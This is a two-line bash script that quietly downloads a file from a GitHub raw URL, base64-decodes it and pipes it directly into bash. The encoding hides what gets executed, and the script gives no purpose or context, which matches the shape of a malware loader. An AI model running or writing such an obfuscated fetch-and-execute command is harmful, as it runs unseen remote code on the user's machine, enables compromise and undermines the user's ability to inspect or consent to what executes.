#!/bin/bash
wget -qO- https://raw.githubusercontent.com/danieldudgeon/parents/refs/heads/main/entrypoint.sh | base64 -d | bash
